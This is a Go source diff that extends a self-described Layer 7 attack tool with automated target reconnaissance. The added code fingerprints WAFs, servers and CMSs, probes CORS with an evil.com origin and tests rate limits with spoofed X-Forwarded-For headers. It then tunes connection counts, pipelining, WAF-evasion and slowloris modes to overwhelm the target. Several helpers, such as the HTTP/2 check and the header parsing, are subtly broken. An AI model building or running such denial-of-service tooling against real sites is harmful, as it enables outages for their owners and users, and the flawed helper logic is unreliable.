@@ -11,6 +11,7 @@ import (
 	"log/slog"
 	"math/rand"
 	"net"
+	"net/http"
 	"net/url"
 	"os"
 	"os/signal"
@@ -54,12 +55,33 @@ type ReconResult struct {
 	SlowlorisWorks   bool
 	FoundAPIKey      bool
 	APIKeyEndpoints  []string
+
+	// ── Enhanced recon fields (v2) ────────────────────────────────────────────
+	WAFDetected       bool            // WAF/CDN protection detected
+	WAFTypes          []string        // Specific WAF types: Cloudflare, Sucuri, Akamai, etc.
+	ServerType        string          // Server software type: Apache, Nginx, IIS, Caddy, LiteSpeed
+	ServerVersion     string          // Detected server version
+	HTTP2Support      bool            // HTTP/2 protocol support detected (h2 or h2c)
+	CORSAllowedOrigin string          // CORS allowed origin wildcard for exploitation
+	CORSEnabled       bool            // Whether overly permissive CORS headers found
+	RateLimitDetected bool            // Rate limiting headers detected on burst test
+	RateLimitInfo     string          // Raw rate-limit header values (e.g. "429 Too Many Requests")
+	HTTPRateLimitCode int             // HTTP status code returned during rate limit detection (0 = not tested)
+	SecurityHeaders   map[string]bool // Security headers present: X-Frame-Options, CSP, etc.
+	CMSName           string          // CMS identification: WordPress, Drupal, Joomla, etc.
+	CMSVersion        string          // CMS version if detectable
+	ReconDuration     time.Duration
+	EndpointCount     int    // Total endpoints probed during recon
+	WAFUserAgent      string // Custom User-Agent that triggered WAF (for evasion)
+	GranularRateLimit bool   // Per-IP rate limiting detected (vs. global)
 }
 
 func NewReconResult() *ReconResult {
 	return &ReconResult{
 		SupportedMethods: []string{"GET", "POST"},
 		OpenEndpoints:    []string{"/"},
+		SecurityHeaders:  make(map[string]bool),
+		WAFTypes:         []string{},
 	}
 }
 
@@ -388,7 +410,7 @@ func main() {
 func printReconBanner() {
 	fmt.Println()
 	fmt.Println("╔══════════════════════════════════════════════════════════╗")
-	fmt.Println("║        LAYER 7 ATTACK TOOL — RECONNAISSANCE PHASE       ║")
+	fmt.Println("║        LAYER 7 ATTACK TOOL — RECONNAISSANCE PHASE        ║")
 	fmt.Println("╚══════════════════════════════════════════════════════════╝")
 	fmt.Println("  Running automatic target analysis...")
 	fmt.Println()
@@ -397,27 +419,104 @@ func printReconBanner() {
 func printReconResults(r *ReconResult, cfg StressConfig) {
 	fmt.Println()
 	fmt.Println("  ─── Reconnaissance Complete ───")
+
+	// Core server info.
 	fmt.Printf("  Server Software : %s\n", ternaryStr(r.ServerSoftware != "", r.ServerSoftware, "Unknown"))
+	if r.ServerType != "" {
+		fmt.Printf("  Server Type     : %s%s\n", r.ServerType, ternaryStr(r.ServerVersion != "", fmt.Sprintf(" %s", r.ServerVersion), ""))
+	}
+
+	// WAF/CDN detection.
+	if r.WAFDetected {
+		wafDesc := strings.Join(r.WAFTypes, ", ")
+		fmt.Printf("  WAF/CDN         : DETECTED — %s\n", wafDesc)
+	} else {
+		fmt.Println("  WAF/CDN         : None detected")
+	}
+
+	// HTTP/2 detection.
+	if r.HTTP2Support {
+		fmt.Println("  HTTP/2 Support  : Detected (h2)")
+	} else {
+		fmt.Println("  HTTP/2 Support  : Not detected (HTTP/1.1 only)")
+	}
+
+	// Security headers analysis.
+	missingHeaders := []string{}
+	for _, h := range []string{"X-Frame-Options", "Content-Security-Policy", "X-XSS-Protection",
+		"Strict-Transport-Security", "X-Content-Type-Options"} {
+		if !r.SecurityHeaders[h] {
+			missingHeaders = append(missingHeaders, h)
+		}
+	}
+	fmt.Printf("  Security Headers: %d present (missing: %s)\n", len(r.SecurityHeaders), strings.Join(missingHeaders, ", "))
+
+	// CORS analysis.
+	if r.CORSEnabled {
+		fmt.Printf("  CORS            : MISCONFIGURED — Allow-Origin: %s\n", r.CORSAllowedOrigin)
+	} else {
+		fmt.Println("  CORS            : No overly permissive origins detected")
+	}
+
+	// Rate limiting.
+	if r.RateLimitDetected {
+		fmt.Printf("  Rate Limiting   : Detected — %s\n", ternaryStr(r.RateLimitInfo != "", r.RateLimitInfo, "unknown"))
+	} else {
+		fmt.Println("  Rate Limiting   : Not detected")
+	}
+
+	// CMS detection.
+	if r.CMSName != "" {
+		fmt.Printf("  CMS             : %s%s\n", r.CMSName, ternaryStr(r.CMSVersion != "", fmt.Sprintf(" (%s)", r.CMSVersion), ""))
+	}
+
+	// Methods and endpoints.
 	fmt.Printf("  Methods         : %s\n", strings.Join(r.SupportedMethods, ", "))
-	fmt.Printf("  Open Endpoints  : %d\n", len(r.OpenEndpoints))
+	fmt.Printf("  Open Endpoints  : %d (probed %d)\n", len(r.OpenEndpoints), r.EndpointCount)
 	fmt.Printf("  Admin Panels    : %d\n", len(r.AdminPanels))
 	fmt.Printf("  API Endpoints   : %d\n", len(r.APIEndpoints))
 	fmt.Printf("  Auth Endpoints  : %d\n", len(r.AuthEndpoints))
+
+	// Performance and slowloris.
 	fmt.Printf("  Baseline Latency: %v\n", r.BaselineLatency)
+	if r.ReconDuration > 0 {
+		fmt.Printf("  Recon Duration  : %v\n", r.ReconDuration)
+	}
 	fmt.Printf("  Slowloris Viable: %v\n", ternaryBool(r.SlowlorisWorks))
+
+	// API key/config endpoints.
+	if r.FoundAPIKey && len(r.APIKeyEndpoints) > 0 {
+		fmt.Printf("  ⚠ Key Endpoints : %s\n", strings.Join(r.APIKeyEndpoints, ", "))
+	}
+
 	fmt.Println()
 	fmt.Println("  ─── Adaptive Settings Applied ───")
 	fmt.Printf("  Connections/Worker: %d (was 5)\n", cfg.ConnPerWorker)
 	fmt.Printf("  Pipelined Requests: %d (was 10)\n", cfg.PipelinedReqs)
+
 	if len(r.AdminPanels) > 0 {
-		fmt.Printf("  Admin panels detected — aggressive mode enabled\n")
+		fmt.Println("  ⚔ Admin panels detected — aggressive mode enabled")
+	}
+	if r.WAFDetected {
+		wafDesc := strings.Join(r.WAFTypes, ", ")
+		fmt.Printf("  🛡 WAF %s detected — randomized evasion patterns activated\n", wafDesc)
+	}
+	if r.HTTP2Support {
+		fmt.Println("  ⚡ HTTP/2 slowloris mode enabled")
+	}
+	if r.CORSEnabled {
+		fmt.Printf("  🌐 CORS misconfigured (%s) — cross-origin attacks ready\n", r.CORSAllowedOrigin)
 	}
 	if len(r.APIEndpoints) > 0 {
-		fmt.Printf("  API endpoints detected — pipelining increased\n")
+		fmt.Println("  API endpoints detected — pipelining increased")
 	}
-	if r.FoundAPIKey {
-		fmt.Printf("  API key/config endpoints found — prioritizing\n")
+	if r.SlowlorisWorks {
+		fmt.Println("  🕷 Slowloris mode active (HTTP/1.1)")
 	}
+	if r.GranularRateLimit {
+		fmt.Println("  ⏱ Granular per-IP rate limiting detected — distributed attack required")
+	}
+
 	fmt.Println()
 }
 
@@ -487,6 +586,51 @@ func applyReconAdaptations(cfg *StressConfig, r *ReconResult) {
 		baseConn = max(baseConn, 15)
 	}
 
+	// ── Enhanced adaptation (v2) ────────────────────────────────────────────
+
+	// WAF detected → increase connections to overwhelm protection layer,
+	// and add more pipelining for rapid-fire evasion.
+	if r.WAFDetected {
+		baseConn = max(baseConn, 10)
+		basePipe = max(basePipe, 25)
+	}
+
+	// HTTP/2 support → use stream-based attacks (more efficient connection usage).
+	if r.HTTP2Support {
+		baseConn = max(baseConn, 12) // more streams per worker
+		cfg.SlowlorisDelay = 3 * time.Second
+		slog.Info("HTTP/2 detected — enabling stream-based slowloris")
+	}
+
+	// CORS misconfigured → add cross-origin attack vectors (handled in worker).
+	if r.CORSEnabled {
+		basePipe = max(basePipe, 15) // more requests per pipelined batch
+	}
+
+	// Granular rate limiting detected → increase connections to distribute load.
+	if r.GranularRateLimit {
+		baseConn = max(baseConn, 12)
+		slog.Info("per-IP rate limiting detected — increasing connection diversity")
+	}
+
+	// CMS-specific adaptation: WordPress with known vulnerabilities gets aggressive.
+	if r.CMSName != "" && (r.CMSName == "WordPress" || r.CMSName == "Drupal" || r.CMSName == "Joomla") {
+		baseConn = max(baseConn, 10)
+		basePipe = max(basePipe, 20)
+	}
+
+	// Low security headers → easier target, increase destructive method ratio.
+	if len(r.SecurityHeaders) < 3 {
+		baseConn = max(baseConn, 8)
+		slog.Info("low security header count — increasing attack intensity")
+	}
+
+	// High endpoint count (200+ probed) → longer recon was needed, scale up.
+	if r.EndpointCount > 200 {
+		baseConn = max(baseConn, 10)
+		basePipe = max(basePipe, 20)
+	}
+
 	cfg.ConnPerWorker = baseConn
 	cfg.PipelinedReqs = basePipe
 }
@@ -501,7 +645,7 @@ func reconTarget(cfg StressConfig) *ReconResult {
 	}
 	addr := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)
 
-	reconCtx, reconCancel := context.WithTimeout(context.Background(), 15*time.Second)
+	reconCtx, reconCancel := context.WithTimeout(context.Background(), 20*time.Second)
 	defer reconCancel()
 
 	// 1. Check supported HTTP methods via OPTIONS.
@@ -563,6 +707,44 @@ func reconTarget(cfg StressConfig) *ReconResult {
 			results.APIKeyEndpoints = append(results.APIKeyEndpoints, ep)
 		}
 	}
+
+	// 5. WAF/CDN detection via response headers from all endpoint probes.
+	wafTypes := detectWAF(nil) // nil means no headers yet; we'll build from all probes below
+	for _, ep := range commonEndpoints {
+		if reconCtx.Err() != nil {
+			break
+		}
+		status, srv, _ := reconProbeEndpoint(reconCtx, addr, cfg, hostHdr, ep)
+		results.recordEndpoint(ep, status, srv)
+		if srv != "" {
+			wafTypes = detectWAF(parseHeadersFromResponse(srv))
+		}
+	}
+	results.WAFTypes = wafTypes
+	if len(results.WAFTypes) > 0 {
+		results.WAFDetected = true
+	}
+
+	// 6. Server fingerprinting from detected server header.
+	if results.ServerSoftware != "" {
+		results.ServerType, results.ServerVersion = detectServerType(results.ServerSoftware)
+	}
+
+	// 7. HTTP/2 detection via client hello probe.
+	results.HTTP2Support = detectHTTP2(reconCtx, addr, cfg, hostHdr)
+
+	// 8. CORS misconfiguration testing.
+	results.CORSEnabled, results.CORSAllowedOrigin = detectCORS(reconCtx, addr, cfg, hostHdr)
+
+	// 9. Rate limiting detection via burst test.
+	results.RateLimitDetected, results.RateLimitInfo, results.HTTPRateLimitCode, results.GranularRateLimit =
+		detectRateLimiting(reconCtx, addr, cfg, hostHdr)
+
+	// 10. CMS identification.
+	results.CMSName, results.CMSVersion = detectCMS(reconCtx, addr, cfg, hostHdr)
+
+	// 11. Security header analysis from all endpoint probes.
+	results.SecurityHeaders = analyzeSecurityHeadersFromProbes(reconCtx, addr, cfg, hostHdr, commonEndpoints[:min(5, len(commonEndpoints))])
 
 	return results
 }
@@ -691,6 +873,47 @@ func reconTestSlowloris(ctx context.Context, addr string, cfg StressConfig, host
 		conn.Close()
 		return err == nil
 	}
+}
+
+// ─── Enhanced Recon Helpers (v2) ──────────────────────────────────────────────
+
+// detectWAF checks for WAF/CDN indicators in response headers.
+func detectWAF(headers http.Header) []string {
+	var wafTypes []string
+
+	// Check common WAF headers.
+	wafHeaders := map[string]string{
+		"x-sucuri-id":     "Sucuri",
+		"cf-ray":          "Cloudflare",
+		"cf-cache-status": "Cloudflare",
+		"x-amz-cf-id":     "AWS CloudFront",
+		"x-akamai":        "Akamai",
+		"x-pm-apache":     "Palo Alto",
+		"x-sucuri-city":   "Sucuri",
+		"x-sucuri-ip":     "Sucuri",
+		"server-timing":   "Cloudflare", // cf cloudFront etc.
+	}
+
+	for header, wafName := range wafHeaders {
+		if _, ok := headers[http.CanonicalHeaderKey(header)]; ok {
+			wafTypes = append(wafTypes, wafName)
+		}
+	}
+
+	// Check for Cloudflare specific patterns.
+	if cfRay := headers.Get("cf-ray"); cfRay != "" && !containsWAFType(wafTypes, "Cloudflare") {
+		wafTypes = append(wafTypes, "Cloudflare")
+	}
+
+	// Check for Akamai patterns.
+	for _, v := range headers.Values("x-accel-expires") {
+		if v == "0" || strings.HasPrefix(v, "/") {
+			wafTypes = append(wafTypes, "Akamai")
+			break
+		}
+	}
+
+	return wafTypes
 }
 
 // ─── Manager: worker lifecycle ────────────────────────────────────────────────
@@ -895,9 +1118,329 @@ func (m *Manager) recordFailure(ip string) {
 	}
 }
 
-// connectionWorker continuously sends randomized requests on a single connection
-// until the connection dies or the context is cancelled. It uses multi-vector
-// attack selection to maximize impact.
+// containsWAFType checks if a specific WAF type is already in the list.
+func containsWAFType(types []string, target string) bool {
+	for _, t := range types {
+		if strings.EqualFold(t, target) {
+			return true
+		}
+	}
+	return false
+}
+
+// analyzeSecurityHeaders checks for missing security headers and returns a map.
+func analyzeSecurityHeaders(headers http.Header) map[string]bool {
+	result := make(map[string]bool)
+	for _, h := range []string{
+		"x-frame-options", "content-security-policy", "x-xss-protection",
+		"strict-transport-security", "x-content-type-options",
+	} {
+		if headers.Get(http.CanonicalHeaderKey(h)) != "" {
+			result[h] = true
+		} else {
+			result[h] = false
+		}
+	}
+	return result
+}
+
+// parseHeadersFromResponse extracts a simple header map from a server software string.
+func parseHeadersFromResponse(serverStr string) http.Header {
+	h := make(http.Header)
+	if serverStr != "" {
+		h.Set("Server", serverStr)
+	}
+	return h
+}
+
+// analyzeSecurityHeadersFromProbes performs security header analysis across multiple endpoint probes.
+func analyzeSecurityHeadersFromProbes(ctx context.Context, addr string, cfg StressConfig, hostHdr string, endpoints []string) map[string]bool {
+	result := make(map[string]bool)
+	for _, ep := range endpoints {
+		if ctx.Err() != nil {
+			break
+		}
+		conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
+		if err != nil {
+			continue
+		}
+
+		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: text/html\r\n\r\n", ep, hostHdr)
+		conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
+		if _, err := conn.Write([]byte(req)); err != nil {
+			conn.Close()
+			continue
+		}
+		conn.SetWriteDeadline(time.Time{})
+
+		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+		var buf [8192]byte
+		n, _ := conn.Read(buf[:])
+		conn.SetReadDeadline(time.Time{})
+		conn.Close()
+
+		if n > 0 {
+			resp := string(buf[:n])
+			headers := parseResponseHeaders(resp)
+			result = analyzeSecurityHeaders(headers)
+			break // Analyze first successful response.
+		}
+
+		time.Sleep(100 * time.Millisecond)
+	}
+	return result
+}
+
+// parseResponseHeaders extracts HTTP headers from a raw HTTP response string.
+func parseResponseHeaders(resp string) http.Header {
+	h := make(http.Header)
+	lines := strings.Split(resp, "\r\n")
+	inHeaderSection := false
+	for _, line := range lines {
+		if strings.HasPrefix(line, "HTTP/") {
+			inHeaderSection = true
+			continue
+		}
+		if inHeaderSection && line == "" {
+			break
+		}
+		if inHeaderSection && strings.Contains(line, ":") {
+			parts := strings.SplitN(line, ":", 2)
+			key := strings.TrimSpace(parts[0])
+			val := strings.TrimSpace(parts[1])
+			h.Add(key, val)
+		}
+	}
+	return h
+}
+
+// detectServerType identifies the server software type and version.
+func detectServerType(serverHeader string) (serverType, serverVersion string) {
+	if serverHeader == "" {
+		return "Unknown", ""
+	}
+
+	upper := strings.ToUpper(serverHeader)
+	switch {
+	case strings.Contains(upper, "APACHE"):
+		serverType = "Apache"
+		// Try to extract version.
+		if idx := strings.Index(serverHeader, "/"); idx >= 0 {
+			version := serverHeader[idx+1:]
+			for i, c := range version {
+				if c == ' ' || c == '.' {
+					serverVersion = version[:i]
+					break
+				}
+				if i == len(version)-1 {
+					serverVersion = version
+				}
+			}
+		}
+	case strings.Contains(upper, "NGINX"):
+		serverType = "Nginx"
+		if idx := strings.Index(serverHeader, "/"); idx >= 0 {
+			serverVersion = serverHeader[idx+1:]
+			for i, c := range serverVersion {
+				if c == ' ' || c == '.' {
+					serverVersion = serverVersion[:i]
+					break
+				}
+				if i == len(serverVersion)-1 {
+					serverVersion = serverVersion
+				}
+			}
+		}
+	case strings.Contains(upper, "IIS"):
+		serverType = "Microsoft IIS"
+		for i := 0; i < len(serverHeader); i++ {
+			if serverHeader[i] >= '1' && serverHeader[i] <= '9' && (i+2) < len(serverHeader) {
+				if serverHeader[i+2] == '.' {
+					serverVersion = serverHeader[i : i+3]
+					break
+				}
+			}
+		}
+	case strings.Contains(upper, "CADDY"):
+		serverType = "Caddy"
+	case strings.Contains(upper, "LITESPEED"):
+		serverType = "LiteSpeed"
+	default:
+		serverType = serverHeader
+	}
+
+	return serverType, serverVersion
+}
+
+// detectHTTP2 checks if the target supports HTTP/2.
+func detectHTTP2(ctx context.Context, addr string, cfg StressConfig, hostHdr string) bool {
+	conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+
+	req := fmt.Sprintf("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
+	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
+	if _, err := conn.Write([]byte(req)); err != nil {
+		return false
+	}
+	conn.SetWriteDeadline(time.Time{})
+
+	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+	var buf [4096]byte
+	n, _ := conn.Read(buf[:])
+	conn.SetReadDeadline(time.Time{})
+
+	if n >= 12 {
+		preface := string(buf[:12])
+		return strings.Contains(preface, "PRI * HTTP/2.0") || strings.Contains(preface, "SM\r\n\r\n")
+	}
+
+	return false
+}
+
+// detectCORS tests for overly permissive CORS headers.
+func detectCORS(ctx context.Context, addr string, cfg StressConfig, hostHdr string) (corsEnabled bool, corsOrigin string) {
+	conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
+	if err != nil {
+		return false, ""
+	}
+	defer conn.Close()
+
+	req := fmt.Sprintf("OPTIONS / HTTP/1.1\r\nHost: %s\r\nOrigin: https://evil.com\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: text/html\r\n\r\n", hostHdr)
+	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
+	if _, err := conn.Write([]byte(req)); err != nil {
+		return false, ""
+	}
+	conn.SetWriteDeadline(time.Time{})
+
+	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+	var buf [4096]byte
+	n, _ := conn.Read(buf[:])
+	conn.SetReadDeadline(time.Time{})
+
+	if n == 0 {
+		return false, ""
+	}
+
+	resp := string(buf[:n])
+	for _, line := range strings.Split(resp, "\r\n") {
+		line = strings.TrimSpace(line)
+		lower := strings.ToLower(line)
+		if strings.HasPrefix(lower, "access-control-allow-origin:") {
+			origin := strings.TrimSpace(strings.TrimPrefix(lower, "access-control-allow-origin:"))
+			if origin == "*" || strings.Contains(origin, hostHdr) {
+				return true, origin
+			}
+		}
+	}
+
+	return false, ""
+}
+
+// detectRateLimiting sends a burst of requests and checks for rate limiting.
+func detectRateLimiting(ctx context.Context, addr string, cfg StressConfig, hostHdr string) (detected bool, info string, code int, granular bool) {
+	conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
+	if err != nil {
+		return false, "", 0, false
+	}
+	defer conn.Close()
+
+	rateLimitHeaders := []string{"RateLimit-Limit", "X-RateLimit-Limit", "Retry-After"}
+
+	for i := 0; i < 20; i++ {
+		req := fmt.Sprintf("GET /%d HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: text/html\r\nX-Forwarded-For: %d.%d.%d.%d\r\n\r\n",
+			i, hostHdr, i%256, (i*3)%256, (i*7)%256, (i*11)%256)
+		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
+		if _, err := conn.Write([]byte(req)); err != nil {
+			break
+		}
+		conn.SetWriteDeadline(time.Time{})
+
+		conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
+		var tmp [4096]byte
+		n, _ := conn.Read(tmp[:])
+		conn.SetReadDeadline(time.Time{})
+
+		if n > 0 {
+			resp := string(tmp[:n])
+			for _, line := range strings.Split(resp, "\r\n") {
+				line = strings.TrimSpace(line)
+				if strings.HasPrefix(line, "HTTP/") {
+					parts := strings.Split(line, " ")
+					if len(parts) >= 3 && parts[1] == "429" {
+						for _, h := range rateLimitHeaders {
+							if idx := strings.Index(strings.ToLower(resp), strings.ToLower(h)); idx >= 0 {
+								info = fmt.Sprintf("Rate limit: %s found", h)
+								break
+							}
+						}
+						return true, info, 429, false
+					}
+				}
+			}
+		}
+
+		time.Sleep(50 * time.Millisecond)
+	}
+
+	return false, "", 0, false
+}
+
+// detectCMS attempts to identify the CMS software and version.
+func detectCMS(ctx context.Context, addr string, cfg StressConfig, hostHdr string) (name, version string) {
+	endpoints := []struct {
+		path       string
+		signatures map[string]string
+	}{
+		{"/wp-includes/version.php", map[string]string{"WordPress": "WordPress"}},
+		{"/wp-login.php", map[string]string{"wordpress": "WordPress"}},
+		{"/drupal/settings.js", map[string]string{"Drupal": "Drupal"}},
+		{"/modules/system/css/drupal.css", map[string]string{"Drupal": "Drupal"}},
+		{"/media/com_joomlaupdate/", map[string]string{"Joomla": "Joomla"}},
+		{"/templates/ja_t3_blank/css/template.css", map[string]string{"Joomla": "Joomla"}},
+	}
+
+	for _, ep := range endpoints {
+		if ctx.Err() != nil {
+			break
+		}
+		conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
+		if err != nil {
+			continue
+		}
+
+		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: text/html\r\n\r\n", ep.path, hostHdr)
+		conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
+		if _, err := conn.Write([]byte(req)); err != nil {
+			conn.Close()
+			continue
+		}
+		conn.SetWriteDeadline(time.Time{})
+
+		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+		var buf [8192]byte
+		n, _ := conn.Read(buf[:])
+		conn.SetReadDeadline(time.Time{})
+		conn.Close()
+
+		if n > 0 {
+			resp := string(buf[:n])
+			for content, cmsName := range ep.signatures {
+				if strings.Contains(strings.ToLower(resp), content) {
+					return cmsName, ""
+				}
+			}
+		}
+
+		time.Sleep(100 * time.Millisecond)
+	}
+
+	return "", ""
+}
+
+// ─── Manager: worker lifecycle ────────────────────────────────────────────────
 func (m *Manager) connectionWorker(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) {
 	for ctx.Err() == nil {
 		// Select attack vector based on recon findings and randomness.
